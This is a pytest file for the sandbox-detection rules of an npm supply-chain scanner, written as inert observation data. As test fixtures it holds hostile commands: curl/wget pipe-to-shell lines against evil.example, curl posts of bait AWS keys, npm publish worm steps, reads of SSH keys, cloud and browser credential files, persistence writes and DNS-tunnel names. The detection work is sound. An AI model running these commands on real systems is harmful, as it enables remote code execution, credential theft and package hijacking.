"""Stage 5 rules over hand-written package-analysis observations (inert data: nothing is run).

The observations follow the importer's mapping (`kitsunox.sandbox.ossf`): one `exec` per
recorded command (argv and environment, no path, pid or time), one `open` per file with its
read/write/delete flags, one `connect` per socket and resolved name, one `dns` per question;
everything tagged with its phase. `baseline()` is what package-analysis records for a benign
package with a `postinstall` (its driver, npm's own config reads, writes and registry traffic).
One test goes through the real importer from a hand-written result file.
"""

# Paths like /tmp/x here are paths inside package-analysis's sandbox, recorded as data.
# ruff: noqa: S108

import base64
import hashlib
import json
import random
import time
from collections.abc import Sequence
from typing import Any

import pytest

from kitsunox.core.models import (
    Candidate,
    Change,
    EvidenceKind,
    Finding,
    PackageVersionRef,
    PublishInfo,
    Severity,
    VersionSnapshot,
)
from kitsunox.rules.sandbox import (
    DETECTION_RULES,
    DRIVER,
    MAX_EVIDENCE,
    MAX_NETWORK_EVIDENCE,
    MAX_ORIGINS,
    PIPE_RUN,
    QUIET,
    RULES,
    SNIPPET_LIMIT,
    SUBST_RUN,
    BaitExfil,
    Ran,
    SandboxRuleBase,
    analyse,
    apply_rules,
    clip,
    command,
    exec_specs,
    expected_tarball,
    foreign_spec,
    install_elsewhere,
    is_driver,
    module_chain,
    npm_args,
    npm_split,
    npx_args,
    program,
    publishes,
    registry_like,
    shannon_entropy,
    shipped_paths,
    tail,
    tunnel_shape,
    under_image,
    visible,
    yarn_pnpm_specs,
)
from kitsunox.sandbox import ossf
from kitsunox.sandbox.models import (
    Cut,
    GroupCount,
    Observation,
    ObservationKind,
    Phase,
    PhaseResult,
    PhaseStatus,
    RunStatus,
    SandboxJob,
    SandboxRun,
)

K = ObservationKind
NAME = "kx-fixture"
VERSION = "1.0.0"
PKG = f"/app/node_modules/{NAME}"
KEY = hashlib.sha256(b"job").hexdigest()
TARBALL = f"/{KEY}.tgz"  # where package-analysis copies the exported <key>.tgz
SHIPPED = ("package.json", "install.js", "index.js", "bin/tool", ".env.example")
REF = PackageVersionRef(ecosystem="npm", name=NAME, version=VERSION)
CANDIDATE = Candidate(
    change=Change(new=VersionSnapshot(ref=REF, publish=PublishInfo(), manifest={}))
)
REGISTRY_IP = "104.16.0.35"
KEY_MARK = "[canary:AWS_ACCESS_KEY_ID]"
SECRET_MARK = "[canary:AWS_SECRET_ACCESS_KEY]"  # noqa: S105 (the importer's mask)
BAIT_ENV = (f"AWS_ACCESS_KEY_ID={KEY_MARK}", f"AWS_SECRET_ACCESS_KEY={SECRET_MARK}", "HOME=/root")


def job() -> SandboxJob:
    return SandboxJob(
        ref=REF,
        tarball_sha256=hashlib.sha256(b"tarball").hexdigest(),
        integrity=None,
        hooks=("postinstall",),
        key=KEY,
    )


def make_run(
    phases: Sequence[tuple[Phase, PhaseStatus]] = (
        ("install", "completed"),
        ("import", "completed"),
    ),
    *,
    status: RunStatus = "completed",
    truncated: bool = False,
    canaries: tuple[str, ...] = ("AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY"),
    count: int = 0,
    stdout: str = "",
    cuts: dict[Cut, int] | None = None,
    groups: tuple[GroupCount, ...] = (),
) -> SandboxRun:
    return SandboxRun(
        job=job(),
        status=status,
        phases=tuple(PhaseResult(phase=p, status=s, stdout=stdout) for p, s in phases),
        result_sha256=hashlib.sha256(b"result").hexdigest(),
        created=1767225600,
        observation_count=count,
        truncated=truncated or bool(cuts),
        cuts=cuts or {},
        groups=groups,
        canaries=canaries,
    )


def ex(*argv: str, phase: Phase = "install", env: tuple[str, ...] = BAIT_ENV) -> Observation:
    return Observation(phase=phase, kind=K.EXEC, source="strace", argv=argv, env=env)


def op(path: str, *flags: Any, phase: Phase = "install") -> Observation:
    return Observation(phase=phase, kind=K.OPEN, source="strace", path=path, flags=flags)


def conn(
    address: str, port: int | None = 443, host: str | None = None, phase: Phase = "install"
) -> Observation:
    return Observation(
        phase=phase, kind=K.CONNECT, source="strace", address=address, port=port, host=host
    )


def dns(host: str, phase: Phase = "install", detail: str = "IN A AAAA") -> Observation:
    return Observation(phase=phase, kind=K.DNS, source="pcap", host=host, detail=detail)


def baseline() -> list[Observation]:
    """A benign package with `postinstall: node install.js`, as package-analysis records it."""
    return [
        # install: the driver, npm init, npm install of the copied tarball, the hook.
        ex(DRIVER, "--local", TARBALL, "install", NAME),
        ex("node", DRIVER, "--local", TARBALL, "install", NAME),
        ex("sleep", "30m"),
        ex("npm", "init", "--force"),
        ex("node", "/usr/bin/npm", "init", "--force"),
        ex("npm", "install", TARBALL),
        ex("node", "/usr/bin/npm", "install", TARBALL),
        ex("sh", "-c", "node install.js"),
        ex("node", "install.js"),
        op("/root/.npmrc", "read"),
        op("/app/.npmrc", "read"),
        op("/usr/lib/node_modules/npm/npmrc", "read"),
        op("/app/package.json", "read", "write"),
        op("/app/package-lock.json", "write"),
        op(f"{PKG}/install.js", "read", "write"),
        op(f"{PKG}/.env.example", "write"),
        op("/app/node_modules/.package-lock.json", "write"),
        op("/root/.npm/_cacache/index-v5/aa/bb", "read", "write"),
        op("/root/.npm/_logs/2026-10-30T00_00_00_000Z-debug-0.log", "write"),
        op("/tmp", "read"),
        conn("8.8.8.8", 53),
        conn("8.8.4.4", 53),
        conn("0.0.0.0", None),  # noqa: S104 (recorded data, not a bind here)
        conn(REGISTRY_IP, 443, "registry.npmjs.org"),
        dns("registry.npmjs.org"),
        # import: the driver's require().
        ex(DRIVER, "--local", TARBALL, "import", NAME, phase="import"),
        ex("node", DRIVER, "--local", TARBALL, "import", NAME, phase="import"),
        op(f"{PKG}/package.json", "read", phase="import"),
        op(f"{PKG}/index.js", "read", phase="import"),
    ]


def findings(
    observations: Sequence[Observation],
    run: SandboxRun | None = None,
    shipped: Sequence[str] | None = None,
) -> tuple[Finding, ...]:
    return apply_rules(CANDIDATE, run or make_run(), observations, shipped=shipped)


def ids(found: Sequence[Finding]) -> list[str]:
    return [f.rule_id for f in found]


def only(rule_id: str, found: Sequence[Finding]) -> Finding:
    matching = [f for f in found if f.rule_id == rule_id]
    assert len(matching) == 1, ids(found)
    return matching[0]


def snippets(finding: Finding) -> list[str]:
    return [e.snippet or "" for e in finding.evidence]


def paths(finding: Finding) -> list[str]:
    return [e.path or "" for e in finding.evidence]


# --- the baseline ----------------------------------------------------------------------------


def test_benign_install_is_quiet() -> None:
    assert ids(findings(baseline(), shipped=SHIPPED)) == ["sandbox.ran", "sandbox.quiet"]
    found = findings(baseline())
    assert ids(found) == ["sandbox.ran", "sandbox.quiet"]
    quiet = found[-1]
    assert quiet.severity is Severity.INFO and quiet.weight == 0.0
    assert "not evidence of safety" in quiet.explanation
    assert "install, import" in quiet.explanation


def test_findings_do_not_depend_on_input_order() -> None:
    observations = [
        *baseline(),
        ex("curl", "-s", "https://evil.example/x"),
        op("/root/.ssh/id_rsa", "read", phase="import"),
        dns("evil.example"),
        conn("203.0.113.9", 8080),
        ex("npm", "install", "/stage2.tgz"),
        ex("sh"),
        op(f"{PKG}/stage2.js", "write"),
        ex("node", "stage2.js"),
        ex("node-gyp", "rebuild"),
        ex("mkdir", "-p", "Release/obj.target"),
    ]
    expected = findings(observations, shipped=SHIPPED)
    assert {"sandbox.nested-install", "sandbox.download-run", "sandbox.download-exec"} <= set(
        ids(expected)
    )
    for seed in range(5):
        rng = random.Random(seed)  # noqa: S311 (a test permutation)
        shuffled = observations[:]
        rng.shuffle(shuffled)
        files = list(SHIPPED)
        rng.shuffle(files)
        assert findings(shuffled, shipped=files) == expected


def test_rules_one_by_one_equal_apply_rules() -> None:
    observations = (*baseline(), ex("wget", "http://evil.example/p"), ex("node", f"{PKG}/x.js"))
    run = make_run()
    one_by_one = tuple(f for rule in RULES for f in rule.evaluate(CANDIDATE, run, observations))
    assert one_by_one == apply_rules(CANDIDATE, run, observations)
    given = tuple(
        f
        for rule in (*DETECTION_RULES, QUIET)
        for f in rule.evaluate(CANDIDATE, run, observations, shipped=SHIPPED)
    )
    assert given == apply_rules(CANDIDATE, run, observations, shipped=SHIPPED) != one_by_one
    assert QUIET in RULES and all(rule in RULES for rule in DETECTION_RULES)


def test_every_rule_has_a_distinct_id_and_documented_text() -> None:
    assert len({rule.id for rule in RULES}) == len(RULES)
    for rule in RULES:
        assert rule.id.startswith("sandbox.")
        assert type(rule).__doc__
    assert "sandbox.canary-exfil" not in {rule.id for rule in RULES}


def test_evidence_is_metadata_and_capped() -> None:
    observations = [ex(f"tool{i}") for i in range(MAX_EVIDENCE + 5)]
    finding = only("sandbox.process-spawn", findings(observations))
    assert len(finding.evidence) == MAX_EVIDENCE
    assert f"Showing {MAX_EVIDENCE} of {MAX_EVIDENCE + 5} items" in finding.explanation
    assert all(e.kind is EvidenceKind.METADATA for e in finding.evidence)


# --- run status: ran, truncated, quiet -------------------------------------------------------


def test_ran_describes_phases_counts_masks_and_output_tail() -> None:
    run = make_run(stdout="x" * 1000 + "Install succeeded.\n")
    finding = only("sandbox.ran", Ran().evaluate(CANDIDATE, run, baseline()))
    assert finding.weight == 0.0 and finding.severity is Severity.INFO
    text = finding.explanation
    assert "install (completed), import (completed)" in text
    assert "Declared install hooks: postinstall" in text
    assert "bait values masked: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY" in text
    assert ossf.CANARY_MARK.split("{")[0] not in text  # names only, no values
    outputs = [e for e in finding.evidence if (e.path or "").startswith("output")]
    assert [e.path for e in outputs] == ["output (import stdout)", "output (install stdout)"]
    assert all((e.snippet or "").endswith("Install succeeded.\\u000a") for e in outputs)


def test_tail_keeps_the_end_and_escapes() -> None:
    assert tail("short\x1b[2J") == "short\\u001b[2J"
    long = tail("a" * 500 + "the end")
    assert long.endswith("the end") and long.startswith("[207 chars before]")


def test_truncated_record_is_scored_and_never_quiet() -> None:
    found = findings(baseline(), make_run(truncated=True, count=100_000))
    finding = only("sandbox.truncated", found)
    assert finding.severity is Severity.MEDIUM and finding.weight == 3.0
    assert "100000 kept" in finding.explanation
    assert "sandbox.quiet" not in ids(found)


def test_timed_out_phase_is_truncated() -> None:
    run = make_run((("install", "error_timeout"),), status="timeout")
    found = findings(baseline()[:3], run)
    assert "timed out during install" in only("sandbox.truncated", found).explanation
    assert "sandbox.quiet" not in ids(found)


@pytest.mark.parametrize("cut", ["argv_items", "env_items", "hostnames", "observations"])
def test_flooding_a_count_cap_is_high(cut: Cut) -> None:
    run = make_run(cuts={cut: 7, "field_chars": 2}, count=100_000)
    found = findings(baseline(), run)
    finding = only("sandbox.truncated", found)
    assert finding.severity is Severity.HIGH and finding.weight == 5.0
    text = finding.explanation
    assert "Flooding: count caps hit" in text
    assert f"{ossf.MAX_FIELD_CHARS} characters: 2" in text  # every cap is named
    named = {
        "argv_items": f"commands with over {ossf.MAX_ARGV} arguments: 7",
        "env_items": f"commands with over {ossf.MAX_ENV} environment entries: 7",
        "hostnames": f"sockets with over {ossf.MAX_HOSTNAMES} names: 7",
        "observations": f"observations dropped over the {ossf.MAX_OBSERVATIONS} cap: 7",
    }
    assert named[cut] in text
    assert "sandbox.quiet" not in ids(found)


def test_flooding_names_the_groups_the_observation_cap_cut() -> None:
    groups = (
        GroupCount(phase="install", kind=K.OPEN, recorded=250_000, kept=60_000, priority=3,
                   priority_kept=3),
        GroupCount(phase="install", kind=K.EXEC, recorded=12, kept=12, priority=0,
                   priority_kept=0),
    )  # fmt: skip
    run = make_run(cuts={"observations": 190_000}, groups=groups, count=100_000)
    finding = only("sandbox.truncated", findings(baseline(), run))
    assert "groups cut: install open: 250000 recorded, 60000 kept." in finding.explanation
    assert "install exec" not in finding.explanation


@pytest.mark.parametrize("cut", ["field_chars", "name_chars", "output_bytes", "dns_types"])
def test_length_cuts_stay_medium(cut: Cut) -> None:
    finding = only("sandbox.truncated", findings(baseline(), make_run(cuts={cut: 1})))
    assert finding.severity is Severity.MEDIUM and finding.weight == 3.0
    assert "Flooding" not in finding.explanation
    assert ": 1;" in finding.explanation  # named with its count


def test_a_timeout_with_a_flood_is_high_and_says_both() -> None:
    run = make_run((("install", "error_timeout"),), status="timeout", cuts={"env_items": 1})
    finding = only("sandbox.truncated", findings(baseline()[:3], run))
    assert finding.severity is Severity.HIGH
    assert "timed out during install" in finding.explanation
    assert "environment entries: 1" in finding.explanation


@pytest.mark.parametrize(
    ("phases", "status"),
    [
        ((("install", "error_analysis"),), "failed"),
        ((("install", "completed"), ("import", "error_analysis")), "failed"),
        ((("install", "error_other"),), "infra-error"),
        ((("install", "completed"),), "infra-error"),
        ((), "infra-error"),
    ],
)
def test_failed_or_missing_runs_are_never_quiet(
    phases: Sequence[tuple[Phase, PhaseStatus]], status: RunStatus
) -> None:
    run = make_run(phases, status=status)
    found = findings(baseline(), run)
    assert "sandbox.quiet" not in ids(found)
    assert "sandbox.truncated" not in ids(found)
    if phases:
        assert "not completed" in only("sandbox.ran", found).explanation


def test_quiet_only_when_nothing_above_info_fired() -> None:
    run = make_run()
    assert QUIET.after(run, ()) != ()
    low = only("sandbox.network", findings([dns("github.com")]))
    assert low.severity is Severity.LOW
    assert QUIET.after(run, (low,)) == ()


# --- npm-publish -----------------------------------------------------------------------------


@pytest.mark.parametrize(
    "argv",
    [
        ("npm", "publish"),
        ("npm", "--registry", "https://registry.npmjs.org/", "publish", "--access", "public"),
        ("node", "/usr/bin/npm", "publish"),
        ("/tmp/npm", "publish"),
        ("sh", "-c", "cd /tmp/worm && npm version patch && npm publish"),
        ("bash", "-c", "node /usr/lib/node_modules/npm/bin/npm-cli.js publish ./x.tgz"),
        ("curl", "-X", "PUT", "https://registry.npmjs.org/victim", "-d", "@doc.json"),
        ("curl", "-XPUT", "https://user:t@registry.npmjs.org/victim"),
        ("curl", "-T", "x.tgz", "https://npm.pkg.github.com/victim"),
        ("wget", "--method=PUT", "https://registry.example.com/victim"),
        ("sh", "-c", "curl --request PUT https://registry.npmjs.org/victim -d @d"),
        ("sh", "-c", "npm publish 'unbalanced"),
    ],
)
def test_publishing_commands_fire(argv: tuple[str, ...]) -> None:
    assert publishes(argv)
    finding = only("sandbox.npm-publish", findings([*baseline(), ex(*argv, phase="import")]))
    assert finding.severity is Severity.CRITICAL and finding.weight == 10.0
    assert paths(finding) == ["exec (import)"]


@pytest.mark.parametrize(
    "argv",
    [
        ("npm", "run", "publish"),
        ("npm", "view", "publish"),
        ("npm", "install", "publish-utils"),
        ("curl", "-X", "PUT", "https://example.com/report"),
        ("curl", "https://registry.npmjs.org/left-pad"),
        ("sh", "-c", "echo 'unbalanced"),
        ("node", "scripts/publish.js"),
    ],
)
def test_non_publishing_commands_do_not(argv: tuple[str, ...]) -> None:
    assert not publishes(argv)


def test_registry_like() -> None:
    assert registry_like("registry.npmjs.org")
    assert registry_like("REGISTRY.NPMJS.ORG.")
    assert registry_like("npm.pkg.github.com")
    assert registry_like("registry.corp.example:4873")
    assert not registry_like("registry.")
    assert not registry_like("npmjs.org.evil.example")


# --- bait-exfil ------------------------------------------------------------------------------


def test_masked_bait_in_a_command_line_is_critical() -> None:
    curl = ex("curl", "-d", f"k={KEY_MARK}&s={SECRET_MARK}", "https://evil.example/c")
    finding = only("sandbox.bait-exfil", findings([*baseline(), curl]))
    assert finding.severity is Severity.CRITICAL and finding.weight == 10.0
    assert paths(finding) == ["command line (install)"]
    assert KEY_MARK in snippets(finding)[0]


def test_masked_bait_in_dns_path_or_another_variable() -> None:
    observations = [
        dns(f"{KEY_MARK}.evil.example", phase="import"),
        op(f"/tmp/{SECRET_MARK}", "write"),
        ex("node", "x.js", env=(*BAIT_ENV, f"DATA={KEY_MARK}")),
    ]
    finding = only("sandbox.bait-exfil", findings(observations))
    assert finding.severity is Severity.CRITICAL
    assert sorted(paths(finding)) == [
        "dns name (import)",
        "environment variable DATA (install)",
        "file path (install)",
    ]


def test_bait_in_its_own_variable_is_where_it_was_planted() -> None:
    swapped = ex("node", "x.js", env=(f"AWS_ACCESS_KEY_ID={KEY_MARK}{KEY_MARK}",))
    assert "sandbox.bait-exfil" not in ids(findings([*baseline(), swapped]))
    crossed = ex("node", "x.js", env=(f"AWS_ACCESS_KEY_ID={SECRET_MARK}",))
    assert "sandbox.bait-exfil" in ids(findings([crossed]))


def test_credential_shapes_without_the_mark_are_high() -> None:
    observations = [
        ex("aws", "configure", "set", "aws_access_key_id", "AKIAABCDEFGHIJKLMNOP"),
        ex("curl", "-d", "-----BEGIN OPENSSH PRIVATE KEY-----\nb3Bl", "https://x.example"),
        dns("akiaabcdefghijklmnop.evil.example"),
    ]
    finding = only("sandbox.bait-exfil", findings(observations))
    assert finding.severity is Severity.HIGH and finding.weight == 5.0
    assert sorted({e.after or "" for e in finding.evidence}) == ["AWS access key ID", "private key"]
    assert not BaitExfil().evaluate(CANDIDATE, make_run(), [ex("echo", "AKIAABCDEFGHIJKLMNOPQ")])


# --- sensitive-read --------------------------------------------------------------------------


def test_reading_the_planted_ssh_key_and_credential_stores() -> None:
    observations = [
        *baseline(),
        op("/root/.ssh/id_rsa", "read"),
        op("/root/.ssh", "read"),
        op("/root/.aws/credentials", "read", phase="import"),
        op("/proc/self/environ", "read"),
        op("/root/.config/google-chrome/Default/Login Data", "read"),
        op("/root/.ssh/known_hosts", "write"),  # a write is not a read
    ]
    finding = only("sandbox.sensitive-read", findings(observations))
    assert finding.severity is Severity.HIGH and finding.weight == 5.0
    assert "the SSH key package-analysis plants" in finding.explanation
    assert sorted(paths(finding)) == [
        "/proc/self/environ",
        "/root/.aws/credentials",
        "/root/.config/google-chrome/Default/Login Data",
        "/root/.ssh",
        "/root/.ssh/id_rsa",
    ]
    assert "read (import)" in snippets(finding)


def test_npmrc_is_npms_own_in_install_and_the_packages_in_import() -> None:
    assert "sandbox.sensitive-read" not in ids(findings([op("/root/.npmrc", "read")]))
    finding = only("sandbox.sensitive-read", findings([op("/root/.npmrc", "read", phase="import")]))
    assert paths(finding) == ["/root/.npmrc"]
    assert "plants" not in finding.explanation
    # The explanation says why an install-phase read isn't counted.
    assert "indistinguishable from npm's own" in finding.explanation
    assert "records no process per file" in finding.explanation
    ssh = only("sandbox.sensitive-read", findings([op("/root/.ssh/id_rsa", "read")]))
    assert ".npmrc reads count only in import" in ssh.explanation


@pytest.mark.parametrize(
    "path", ["/root/.npmrc", "/app/.npmrc", "/root/.ssh/id_rsa", "/root/.ssh/config"]
)
def test_npmrc_and_ssh_reads_in_import_are_high(path: str) -> None:
    finding = only(
        "sandbox.sensitive-read", findings([*baseline(), op(path, "read", phase="import")])
    )
    assert finding.severity is Severity.HIGH and finding.weight == 5.0
    assert "npm doesn't run there" in finding.explanation
    assert "Upstream evidence: package-analysis Files (Read) (import)." in finding.explanation


def test_a_relative_path_is_matched_as_recorded() -> None:
    finding = only("sandbox.sensitive-read", findings([op("./.ssh/../.ssh/id_ed25519", "read")]))
    assert paths(finding) == [".ssh/id_ed25519"]


def test_files_in_node_modules_are_not_credentials() -> None:
    observations = [
        op(f"{PKG}/.env", "read", phase="import"),
        op("/app/node_modules/dep/.npmrc", "read"),
        op("/app/node_modules/../.env", "read", phase="import"),  # resolves to /app/.env
    ]
    finding = only("sandbox.sensitive-read", findings(observations))
    assert paths(finding) == ["/app/.env"]


# --- persistence-write -----------------------------------------------------------------------


def test_persistence_writes_fire_in_any_phase() -> None:
    observations = [
        *baseline(),
        op("/root/.bashrc", "read", "write"),
        op("/app/.git/hooks/pre-commit", "write"),
        op("/usr/local/bin/node", "write"),
        op("/etc/ld.so.preload", "write", phase="import"),
        op("/root/.npmrc", "write"),
    ]
    finding = only("sandbox.persistence-write", findings(observations))
    assert finding.severity is Severity.HIGH
    assert dict(zip(paths(finding), (e.after for e in finding.evidence), strict=True)) == {
        "/app/.git/hooks/pre-commit": "git hook",
        "/etc/ld.so.preload": "dynamic loader preload",
        "/root/.bashrc": "shell startup file",
        "/root/.npmrc": "npm config",
        "/usr/local/bin/node": "system program directory",
    }


def test_npms_install_writes_count_only_in_import() -> None:
    install = [
        op("/app/package.json", "write"),
        op("/app/node_modules/other/index.js", "write"),
        op("/app/node_modules/dep/.github/workflows/ci.yml", "write"),
    ]
    assert "sandbox.persistence-write" not in ids(findings(install))
    imported = [op(o.path or "", "write", phase="import") for o in install]
    finding = only("sandbox.persistence-write", findings(imported))
    assert sorted(e.after or "" for e in finding.evidence) == [
        "CI workflow",
        "node_modules",
        "project manifest",
    ]


def test_own_directory_cache_and_tmp_are_not_persistence() -> None:
    observations = [
        op(f"{PKG}/build/Release/addon.node", "write", phase="import"),
        op("/app/node_modules/.cache/babel/x.json", "write", phase="import"),
        op("/root/.npm/_cacache/tmp/x", "write", phase="import"),
        op("/tmp/.bashrc", "write", phase="import"),
    ]
    assert "sandbox.persistence-write" not in ids(findings(observations))


# --- download-exec ---------------------------------------------------------------------------


def test_a_written_file_run_in_the_same_or_a_later_phase() -> None:
    observations = [
        *baseline(),
        op("/tmp/p", "write"),
        ex("/tmp/p", "--daemon"),
        op("/root/.cache/x.js", "write"),
        ex("node", "/root/.cache/x.js", phase="import"),
        op("/usr/local/bin/helper", "write"),
        ex("helper"),  # found on PATH
    ]
    finding = only("sandbox.download-exec", findings(observations))
    assert finding.severity is Severity.HIGH
    assert sorted(paths(finding)) == ["/root/.cache/x.js", "/tmp/p", "/usr/local/bin/helper"]
    assert "written, then exec (import)" in [e.after for e in finding.evidence]


def test_a_file_written_after_it_ran_is_not_download_exec() -> None:
    observations = [ex("node", "/tmp/x.js"), op("/tmp/x.js", "write", phase="import")]
    assert "sandbox.download-exec" not in ids(findings(observations))


def test_shipped_files_npm_unpacked_are_not_download_exec() -> None:
    observations = [
        *baseline(),
        op(f"{PKG}/run.sh", "write"),
        ex("sh", "./run.sh"),
        op("/tmp/shelljs_abc123", "write"),
        ex("node", "/tmp/shelljs_abc123"),
    ]
    assert "sandbox.download-exec" not in ids(findings(observations))


def test_relative_scripts_resolve_against_the_package_and_app() -> None:
    observations = [
        op(f"{PKG}/stage2.sh", "write", phase="import"),
        ex("sh", "./stage2.sh", phase="import"),
    ]
    finding = only("sandbox.download-exec", findings(observations))
    assert paths(finding) == [f"{PKG}/stage2.sh"]


def test_a_dropper_writing_into_its_own_directory_is_download_exec() -> None:
    """The reviewer's probe: `node install.js` writes `<pkg>/stage2.js` and runs it."""
    observations = [
        *baseline(),
        op(f"{PKG}/stage2.js", "write"),
        ex("node", "stage2.js"),
        conn("198.51.100.7", 443, "evil.example"),
    ]
    assert "sandbox.download-exec" not in ids(findings(observations))  # no file list
    finding = only("sandbox.download-exec", findings(observations, shipped=SHIPPED))
    assert finding.severity is Severity.HIGH and finding.weight == 5.0
    assert paths(finding) == [f"{PKG}/stage2.js"]
    assert [e.after for e in finding.evidence] == ["written, then exec (install); in the package"]
    assert "Upstream evidence: package-analysis Files and Commands (install)." in (
        finding.explanation
    )
    assert "Where the paths show it: in the package." in finding.explanation


def test_running_a_path_the_tarball_does_not_ship_is_download_exec() -> None:
    observations = [
        *baseline(),
        ex(f"{PKG}/bin/dropped", phase="import"),  # renamed into place: no write recorded
        ex("node", f"{PKG}/lib/../.cache/x.js"),
        ex(f"{PKG}/bin/tool", "--version"),  # shipped
        ex("node", f"{PKG}/install.js"),  # shipped
        # Airgapped, npm installs nothing under the package's node_modules: not shipped, so
        # put there during the run.
        ex(f"{PKG}/node_modules/dep/bin/x"),
        ex(f"{PKG}/node_modules/.bin/tool"),  # npm's bin link
        ex("node", "-e", f"{PKG}/not-a-script.js"),
    ]
    finding = only("sandbox.download-exec", findings(observations, shipped=SHIPPED))
    assert dict(zip(paths(finding), (e.after for e in finding.evidence), strict=True)) == {
        f"{PKG}/.cache/x.js": "not in the tarball, exec (install); in the package",
        f"{PKG}/bin/dropped": "not in the tarball, exec (import); in the package",
        f"{PKG}/node_modules/dep/bin/x": "not in the tarball, exec (install); in dependency dep",
    }


def test_node_gyp_build_output_is_not_a_dropper() -> None:
    gyp = ex("node-gyp", "rebuild")
    observations = [gyp, op(f"{PKG}/build/Release/gen", "write"), ex(f"{PKG}/build/Release/gen")]
    assert "sandbox.download-exec" not in ids(findings(observations, shipped=SHIPPED))
    without = observations[1:]  # no node-gyp: build/ is the package's own
    assert "sandbox.download-exec" in ids(findings(without, shipped=SHIPPED))


def test_shipped_paths_are_normalised() -> None:
    assert shipped_paths(["./a/../b.js", "c/d", "/abs", "../up", "."]) == {"b.js", "c/d"}


def test_ran_says_whether_the_file_list_was_given() -> None:
    given = only("sandbox.ran", findings(baseline(), shipped=SHIPPED))
    assert f"Tarball file list: {len(SHIPPED)} paths." in given.explanation
    assert "file list not given" in only("sandbox.ran", findings(baseline())).explanation
    assert "Upstream evidence: package-analysis phase Status" in given.explanation


# --- download-run ----------------------------------------------------------------------------


@pytest.mark.parametrize(
    "execs",
    [
        [("curl", "-fsSL", "https://evil.example/x.sh"), ("sh",)],
        [("wget", "-qO-", "http://evil.example/x"), ("bash", "-s", "--", "arg")],
        [("curl", "-sSLo", "/tmp/x.sh", "https://evil.example/x"), ("sh", "/tmp/x.sh")],
        [("curl", "--output", "/tmp/p", "https://evil.example/p"), ("/tmp/p",)],
        [("wget", "-O", "s.py", "https://evil.example/s"), ("python3", "./s.py")],
        [("wget", "https://evil.example/dir/stage.js?x=1"), ("node", "stage.js")],
        [("curl", "-O", "https://evil.example/a/run.sh"), ("bash", "run.sh")],
        [("curl", "https://evil.example/x"), ("node", "-")],
        [("wget", "--output-document=/tmp/w", "https://e.example/w"), ("/tmp/w",)],
        [("curl", "--remote-name", "https://e.example/r.sh"), ("sh", "r.sh")],
        [("curl", "-sO", "https://e.example/o.sh"), ("sh", "o.sh")],
        [("curl", "-o", "/tmp/o", "https://e.example/o"), ("sh", "-e")],
    ],
)
def test_a_download_and_a_runner_in_one_phase(execs: list[tuple[str, ...]]) -> None:
    observations = [*baseline(), *(ex(*argv, phase="import") for argv in execs)]
    finding = only("sandbox.download-run", findings(observations))
    assert finding.severity is Severity.HIGH and finding.weight == 5.0
    assert sorted(snippets(finding)) == sorted(command(argv) for argv in execs)
    assert "Upstream evidence: package-analysis Commands (import)." in finding.explanation


@pytest.mark.parametrize(
    "script",
    [
        "curl -fsSL https://evil.example/x.sh | sh",
        "wget -qO- http://evil.example/x | sudo -E bash",
        "curl -s https://evil.example/x|/bin/bash -s",
        'sh -c "$(curl -fsSL https://evil.example/x)"',
        "bash <(curl -s https://evil.example/x)",
        'eval "$(wget -qO- https://evil.example/x)"',
        "cd /tmp && curl -s https://evil.example/x | node",
    ],
)
def test_a_shell_string_that_pipes_a_download_into_a_runner(script: str) -> None:
    finding = only("sandbox.download-run", findings([*baseline(), ex("sh", "-c", script)]))
    assert [e.after for e in finding.evidence] == ["shell string"]


def test_shell_string_patterns_are_linear() -> None:
    # Before the rewrite every start retried the rest: `x/curl/curl/...` was cubic (16k chars:
    # 93 s), `/a/a/...` and `sh -sh -sh ...` quadratic (64k: 10 s and 6 s).
    n = ossf.MAX_FIELD_CHARS
    for pattern, text in (
        (PIPE_RUN, "x" + "/curl" * 3_000 + ";"),
        (PIPE_RUN, "/a" * (n // 2)),
        (PIPE_RUN, "curl " * (n // 5)),
        (SUBST_RUN, "sh" + " -sh" * (n // 4)),
        (SUBST_RUN, "eval" + " -eval" * (n // 6)),
    ):
        started = time.perf_counter()
        assert pattern.search(text) is None
        assert time.perf_counter() - started < 1.0
    # Spans are unchanged: `start` is where the old match started.
    for pattern, text, span in (
        (PIPE_RUN, "/usr/bin/curl -s x | sudo -E sh", (1, 31)),
        (PIPE_RUN, "/a" * 1_000 + " ./curl x|sh", (2_003, 2_012)),
        (SUBST_RUN, "sh -sh -x $(curl x)", (0, 16)),
        (SUBST_RUN, "x  . -. <(/bin/wget", (2, 19)),
    ):
        match = pattern.search(text)
        assert match is not None and (match.start("start"), match.end()) == span


@pytest.mark.parametrize(
    "execs",
    [
        [("curl", "--version"), ("sh",)],  # no URL
        [("curl", "https://evil.example/x"), ("node", "install.js")],
        [("curl", "https://evil.example/x"), ("node", "--version")],
        [("curl", "-o", "/tmp/a", "https://evil.example/x"), ("sh", "/tmp/b")],
        [("curl", "https://evil.example/x"), ("sh", "-c", "echo curl | grep x")],
        [("wget", "-O", "-", "https://evil.example/x"), ("cat", "-")],
    ],
)
def test_downloads_alone_are_not_download_run(execs: list[tuple[str, ...]]) -> None:
    observations = [*baseline(), *(ex(*argv) for argv in execs)]
    assert "sandbox.download-run" not in ids(findings(observations))


def test_download_run_needs_one_phase() -> None:
    observations = [ex("curl", "https://evil.example/x"), ex("sh", phase="import")]
    assert "sandbox.download-run" not in ids(findings(observations))


# --- dns-tunnel-shape ------------------------------------------------------------------------


def test_dns_names_carrying_data() -> None:
    hexed = b"npm_abcdefghijklmnop".hex()
    observations = [dns(f"{hexed[:30]}.{hexed[30:]}.x.evil.example", phase="import")]
    finding = only("sandbox.dns-tunnel-shape", findings(observations))
    assert finding.severity is Severity.HIGH and finding.weight == 4.0
    assert paths(finding) == ["dns (import)"]


def test_tunnel_shape() -> None:
    assert tunnel_shape("6e706d5f746f6b656e.evil.example") == "hex label of 18 characters"
    b32 = base64.b32encode(b"ghp_secretvalue12345").decode().lower().rstrip("=")
    assert (tunnel_shape(f"{b32}.evil.example") or "").startswith("base32-like")
    assert (tunnel_shape("q8Zk2LmP0xR7vT4nW1yB6cD9fH3jK5sA.evil.example") or "").startswith(
        "random-looking"
    )
    for name in ("registry.npmjs.org", "deadbeefcafebabe.example", "github.com", ""):
        assert tunnel_shape(name) is None
    assert tunnel_shape("a-really-long-but-ordinary-name-here.example") is None


def test_shannon_entropy() -> None:
    assert shannon_entropy("") == 0.0
    assert shannon_entropy("aaaa") == 0.0
    assert shannon_entropy("abcd") == 2.0


# --- network ---------------------------------------------------------------------------------


def test_npm_registry_in_install_resolvers_and_ephemeral_binds_are_expected() -> None:
